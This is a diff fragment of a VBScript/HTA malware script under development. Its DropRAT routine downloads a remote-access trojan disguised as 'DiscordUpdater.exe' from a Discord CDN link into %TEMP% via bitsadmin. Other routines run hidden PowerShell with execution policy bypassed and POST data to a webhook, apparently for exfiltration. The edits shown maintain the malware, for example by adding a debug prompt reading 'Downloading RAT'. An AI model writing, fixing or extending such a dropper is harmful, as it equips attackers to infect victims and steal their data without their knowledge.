@@ -146,12 +146,15 @@ Sub GrabFroststrap()
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- DropRAT (UPDATED) ---
+' --- DropRAT ---
 Sub DropRAT()
     Call PostEmbed("📦 RAT Download", "Fetching DiscordUpdater...", 3447003)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1548568579442479154/1564100269350985750/DiscordUpdater.exe?ex=6ae00963&is=6adeb7e3&hm=9db3df5d18a3377d1a1e916c594b338480204c090af26d5a995cb163275ef083&"
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
+
+    ' If you want to verify the HTA is running, un-comment the next line:
+    ' MsgBox "Downloading RAT..."
 
     sh.Run "bitsadmin /transfer rdownload /download /priority high " & dl & " " & op, 0, False
 
@@ -273,7 +276,7 @@ Sub PostFile(fn, ct)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.SetRequestHeader "Content-Type: multipart/form-data; boundary=" & b
     h.Send bd
     Set h = Nothing
 End Sub
